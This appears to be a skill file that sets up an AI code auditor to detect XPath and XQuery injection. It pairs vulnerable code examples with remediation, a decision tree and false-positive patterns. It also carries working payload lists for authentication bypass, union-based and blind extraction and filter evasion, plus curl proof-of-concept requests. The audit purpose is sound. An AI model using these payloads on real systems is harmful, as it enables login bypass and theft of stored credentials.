---
name: xpath-injection-audit
description: Detection methodology for XPath injection vulnerabilities
---

# Domain Expertise

# XPath/XQuery Injection Auditor

## Expertise

You are an XPath and XQuery injection specialist with deep knowledge of XML query languages, their syntax, and exploitation techniques. You understand the XPath 1.0/2.0/3.0 specifications, XQuery semantics, and how these technologies are used in XML databases and document processing. Your expertise covers authentication bypass, data extraction, and blind injection techniques specific to XML query contexts.

## Core Proficiency

- **XPath query syntax**: Understanding axes, predicates, and functions
- **XQuery evaluation**: Full query language capabilities and risks
- **Escaping requirements**: XML-specific character handling
- **Blind extraction**: Techniques for data extraction without direct output

## Focus Areas

### XPath Query Construction
```python
# VULNERABLE: String interpolation in XPath
def get_user(username, password):
    xpath = f"//user[name='{username}' and password='{password}']"
    return xml_doc.xpath(xpath)

# VULNERABLE: Format string
xpath = "//product[@id='%s']" % product_id

# SAFE: XPath variables (when supported)
xpath = "//user[name=$username and password=$password]"
result = xml_doc.xpath(xpath, username=user, password=pwd)
```

### XQuery in XML Databases
```xquery
(: VULNERABLE: User input in XQuery :)
let $username := "{user_input}"
return doc("users.xml")//user[name=$username]

(: VULNERABLE: Direct concatenation :)
"for $u in doc('users.xml')//user where $u/name='" || $input || "' return $u"
```

### Authentication Bypass Patterns
```python
# VULNERABLE: Auth via XPath
def authenticate(username, password):
    xpath = f"//user[username='{username}'][password='{password}']"
    result = xml_doc.xpath(xpath)
    return len(result) > 0

# Attack: username = "admin' or '1'='1" password = "anything"
# Resulting XPath: //user[username='admin' or '1'='1'][password='anything']
# Returns admin user because '1'='1' is always true
```

### Data Extraction from XML
```python
# VULNERABLE: Product lookup
def get_product(product_id):
    xpath = f"//product[@id='{product_id}']/details"
    return xml_doc.xpath(xpath)

# Attack: product_id = "1']|//user/password|//product[@id='1"
# Extracts user passwords while appearing to query products
```

## Red Flags and Warning Signs

1. **String formatting in XPath**: f-strings, %, + with user input
2. **XPath in authentication**: Login verification via XML queries
3. **XML configuration files**: User data checked against XML
4. **No parameterization**: XPath doesn't have native prepared statements
5. **XML databases**: BaseX, eXist, MarkLogic with user queries
6. **XSLT processing**: XPath expressions in stylesheets
7. **Web services**: SOAP/XML-RPC with XPath-based routing
8. **Content filtering**: XPath for XML content selection

## Attack Patterns

### Boolean-Based Bypass
```xpath
' or '1'='1
' or ''='
' or 1=1 or '1'='1
admin' or '1'='1' or '1'='1
' or name()='user' or '1'='1
```

### Union-Based Data Extraction
```xpath
// Original: //user[name='INPUT']
// Attack: INPUT = '] | //user/password | //x['
// Result: //user[name=''] | //user/password | //x['']
// Returns all passwords via union

// Enumerate node names
'] | //* | //x['
```

### Predicate Manipulation
```xpath
// Original: //user[name='INPUT']
// Attack: INPUT = admin' and '1'='1
// Result: //user[name='admin' and '1'='1']

// Extract data through predicate
'] and substring(//user[1]/password,1,1)='a' and '1'='1
```

### Blind XPath Injection
```xpath
// Character-by-character extraction
// Check if first char of password is 'a'
' or substring(//user[name='admin']/password,1,1)='a' and '1'='1

// Check password length
' or string-length(//user[name='admin']/password)=8 and '1'='1

// Binary search for character codes
' or substring(//user[name='admin']/password,1,1) > 'm' and '1'='1
```

### Document Structure Enumeration
```xpath
// Get root element name
' or name(/*)='root' and '1'='1

// Count nodes
' or count(//user)=5 and '1'='1

// Enumerate child elements
' or name(//user[1]/*[1])='password' and '1'='1
```

## Analysis Methodology

1. **Identify XPath usage**: Find all XML querying code
2. **Trace user input**: Map request parameters to query construction
3. **Check for parameterization**: Most XPath libraries don't support it
4. **Review authentication**: XML-based login verification
5. **Audit data retrieval**: XPath for fetching records
6. **Examine XML databases**: XQuery usage patterns
7. **Test XSLT processing**: XPath in transformation stylesheets
8. **Review error handling**: Do errors reveal query structure?

## Common Protection Bypasses

### Quote Escaping Bypass
```xpath
// If single quotes escaped to ''
admin'' or ''1''=''1  // May still work in some implementations

// Use double quotes if accepted
admin" or "1"="1

// Numeric context (no quotes needed)
// Original: //item[position()=INPUT]
// Attack: 1 or 1=1
```

### Filter Bypass Techniques
```xpath
// If 'or' keyword filtered
admin' | //user | '
' and 1=1 or '1'='1

// If spaces filtered
'or'1'='1
'or/**/'1'='1

// Using XPath functions
' or true() or '
' or not(false()) or '
```

### XQuery-Specific Bypasses
```xquery
(: Comment injection :)
admin' (: injected :) or '1'='1

(: String concatenation :)
' || "admin" || '

(: Using FLWOR expressions :)
'] let $x := //user return $x/password
```

## Example Vulnerable Code

### Example 1: XML Authentication
```python
# auth.py - Vulnerable XML-based auth
from lxml import etree

def login(username, password):
    users_xml = etree.parse('users.xml')

    # VULNERABLE: Direct interpolation
    xpath = f"//user[username='{username}' and password='{password}']"

    result = users_xml.xpath(xpath)

    if result:
        return {"success": True, "user": result[0].get("id")}
    return {"success": False, "error": "Invalid credentials"}

# users.xml:
# <users>
#   <user id="1"><username>admin</username><password>secret123</password></user>
#   <user id="2"><username>user</username><password>pass456</password></user>
# </users>

# Attack: username = "admin' or '1'='1" password = "x"
# XPath becomes: //user[username='admin' or '1'='1' and password='x']
# Returns admin due to operator precedence
```

### Example 2: Content Filtering
```java
// ContentService.java - Vulnerable content filter
@RestController
public class ContentService {

    @GetMapping("/articles")
    public List<Article> getArticles(@RequestParam String category) {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        Document doc = factory.newDocumentBuilder().parse("articles.xml");

        XPath xPath = XPathFactory.newInstance().newXPath();

        // VULNERABLE: Category from user input
        String expression = "//article[category='" + category + "']";

        NodeList nodes = (NodeList) xPath.evaluate(expression, doc, XPathConstants.NODESET);

        return convertToArticles(nodes);
    }
}

// Attack: ?category='] | //user | //x['
// Extracts user data via union injection
```

### Example 3: XML Database Query
```python
# search.py - Vulnerable eXist-db query
import requests

def search_documents(query_term):
    # VULNERABLE: XQuery with user input
    xquery = f'''
    for $doc in collection('/db/documents')
    where contains($doc//content, '{query_term}')
    return $doc//title
    '''

    response = requests.post(
        'http://exist-db:8080/exist/rest/db/',
        data=xquery,
        headers={'Content-Type': 'application/xquery'}
    )

    return response.text

# Attack: query_term = "') or true() or ('"
# Attack: query_term = "'] return doc('/db/users')//password let $x := ['"
```

## Output Format

```markdown
## XPath/XQuery Injection Finding

**Location**: [file:line]
**Severity**: High/Critical
**Confidence**: High/Medium/Low

**Query Type**: [XPath 1.0/XPath 2.0/XQuery]
**XML Library**: [lxml/etree/javax.xml/etc.]

**Vulnerable Code**:
[code block]

**Injection Point**: [parameter/variable name]
**Query Context**: [Authentication/Search/Data retrieval]

**Attack Vector**:
```xpath
[Specific injection payload]
```

**Impact**:
- Authentication bypass: [Yes/No]
- Data extraction: [Yes/No - what data]
- Document enumeration: [Yes/No]
- Blind extraction possible: [Yes/No]

**Proof of Concept**:
```bash
# Boolean-based test
curl "http://target/login" \
  -d "username=admin' or '1'='1&password=x"

# Data extraction
curl "http://target/search?q='] | //user/password | //x['"
```

**Remediation**:
1. Use parameterized XPath if library supports it
2. Implement strict input validation (whitelist characters)
3. Escape special characters: ' " < > & [ ] ( ) / @ : *
4. Use dedicated escaping functions for XPath values
5. Consider using DOM methods instead of XPath for simple lookups
```

---

# Detection Methodology

# XPath Injection Detection

## Methodology

### Step 1: Identify XPath Evaluation Entry Points

Locate all code evaluating XPath expressions against XML documents.

**Python (lxml / xml.etree):**
```python
tree = etree.parse('data.xml')
result = tree.xpath(f"//user[@name='{name}']")           # DANGEROUS
result = tree.findall(f".//user[@name='{name}']")        # DANGEROUS
```

**Java (javax.xml.xpath):**
```java
XPath xpath = XPathFactory.newInstance().newXPath();
xpath.evaluate("//user[@name='" + username + "']", doc); // DANGEROUS
```

**C# / .NET:**
```csharp
doc.SelectNodes("//user[@name='" + username + "']");     // DANGEROUS
nav.Select("//user[@name='" + username + "']");          // DANGEROUS
```

**Node.js (xpath / xmldom):**
```javascript
xpath.select("//user[@name='" + name + "']", doc);       // DANGEROUS
```

### Step 2: Understand XPath Injection Payloads

**Authentication bypass (tautology):**
```
Original:  //user[@name='USERNAME' and @password='PASSWORD']
Payload:   username = admin' or '1'='1
Result:    //user[@name='admin' or '1'='1' and @password='x' or '1'='1']
```

**Data extraction via union:** `admin']/email | //user/password | //x[@a='`

**Blind XPath (character extraction):**
```
//user[substring(password,1,1)='a' and @name='admin']
//user[string-length(password)>5 and @name='admin']
```

### Step 3: Trace User Input to XPath Expressions

```python
# VULNERABLE: direct interpolation
@app.route('/api/user')
def get_user():
    username = request.args.get('username', '')
    xpath_query = f"//users/user[@name='{username}']/profile"
    results = tree.xpath(xpath_query)
```

### Step 4: Check for XPath-Specific Defenses

XPath has limited parameterization support. Defenses rely on validation or escaping.

**Input validation:**
```python
if not re.match(r'^[a-zA-Z0-9_.-]+$', username):
    return 'Invalid username', 400
```

**Quote escaping with concat():**
```python
def escape_xpath(value):
    if "'" not in value: return f"'{value}'"
    elif '"' not in value: return f'"{value}"'
    else:
        parts = value.split("'")
        return "concat(" + ",\"'\",".join(f"'{p}'" for p in parts) + ")"
```

**Java XPathVariableResolver (parameterized):**
```java
xpath.setXPathVariableResolver(name ->
    "username".equals(name.getLocalPart()) ? sanitizedUsername : null);
xpath.evaluate("//users/user[@name=$username]/profile", document);
```

### Step 5: Assess XML Data Sensitivity

Impact depends on the XML content. Authentication data, API keys, and PII in XML files make XPath injection critical. Public catalog data is lower risk.

### Step 6: Check for XPath 2.0+ Extended Features

XPath 2.0 adds `doc()` for reading other files (`doc('/etc/passwd')`) and `string-join()` for bulk extraction.

## Decision Tree

```
User input reaches XPath expression evaluation?
|
+-- NO --> SAFE
|
+-- YES
    |
    XPath variable resolver / parameterization used?
    +-- YES --> SAFE
    +-- NO
        |
        Strict whitelist validation (alphanumeric only)?
        +-- YES --> SAFE
        +-- NO
            |
            Quote escaping (concat() method, both quote types)?
            +-- YES --> HARDENED (Low)
            +-- Partial --> HARDENED (Medium)
            +-- NO
                |
                Sensitive data or auth decisions?
                +-- YES --> VULNERABLE (Critical)
                +-- NO  --> VULNERABLE (High)
```

## Real-World Examples

### Example 1: XML-Based Authentication Bypass

```python
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    tree = etree.parse('users.xml')
    query = f"//user[@username='{username}' and @password='{password}']"
    user = tree.xpath(query)
    if user:
        session['user'] = user[0].get('username')
        return redirect('/dashboard')
```

**Why vulnerable:** Attacker submits `username=admin' or '1'='1`. The tautology bypasses password verification due to XPath operator precedence.

**Impact:** Complete authentication bypass.

**Fix:**
```python
if not re.match(r'^[a-zA-Z0-9_.-]+$', username):
    return render_template('login.html', error='Invalid username')
# Find by username, verify password in Python
user = tree.xpath(f"//user[@username='{username}']")
if user and hmac.compare_digest(user[0].get('password'), hash_password(password)):
    session['user'] = user[0].get('username')
```

### Example 2: Blind XPath Injection in Java Config API

```java
@GetMapping("/api/config")
public ResponseEntity<String> getConfig(@RequestParam String key) {
    String expression = "//config/setting[@key='" + key + "']/@value";
    String value = xpath.evaluate(expression, configDocument);
    return value.isEmpty() ? ResponseEntity.notFound().build() : ResponseEntity.ok(value);
}
```

**Why vulnerable:** Blind injection extracts data character-by-character: `key=x' or substring(//config/setting[@key='secret']/@value,1,1)='a`.

**Impact:** Exposure of all configuration values including database credentials and API keys.

**Fix:**
```java
Set<String> allowedKeys = Set.of("app.name", "app.version", "feature.flags");
if (!allowedKeys.contains(key)) return ResponseEntity.badRequest().body("Invalid key");
xpath.setXPathVariableResolver(name ->
    "key".equals(name.getLocalPart()) ? key : null);
xpath.evaluate("//config/setting[@key=$key]/@value", configDocument);
```

### Example 3: XPath Injection in .NET Product Search

```csharp
[HttpGet("api/products/search")]
public IActionResult SearchProducts(string category, string maxPrice) {
    string xpath = "//product[@category='" + category + "' and @price<=" + maxPrice + "]";
    XmlNodeList results = doc.SelectNodes(xpath);
    // ... process results
}
```

**Why vulnerable:** Both parameters are injectable. `category='] | //* | //x[@a='` dumps all XML nodes. `maxPrice=999] | //*[1=1` bypasses via numeric injection.

**Impact:** Full XML document exfiltration.

**Fix:**
```csharp
var validCategories = new HashSet<string> { "electronics", "books", "clothing" };
if (!validCategories.Contains(category.ToLower())) return BadRequest("Invalid category");
// Use XPathVariableResolver equivalent or validate maxPrice as decimal
```

## Common False Positive Patterns

1. **Hardcoded XPath expressions** -- `doc.SelectNodes("//config/database/host")` with no user input.

2. **ElementTree findall with static paths** -- `tree.findall('.//item')` with no dynamic components.

3. **XPath in XSLT stylesheets** -- Developer-authored expressions in `.xsl` files not generated from user input.

4. **XPath variable resolvers** -- Java `XPathVariableResolver` binding input as typed variables (`$username`).

5. **XPath in XML schema validation** -- `xs:selector` and `xs:field` are schema-level, not runtime-injectable.

6. **Read-only XPath on public data** -- Queries against non-sensitive data. Classify HARDENED (Low) since injection mechanism exists.

7. **Test code and XML fixtures** -- XPath in test suites operating on test fixtures, not reachable in production.
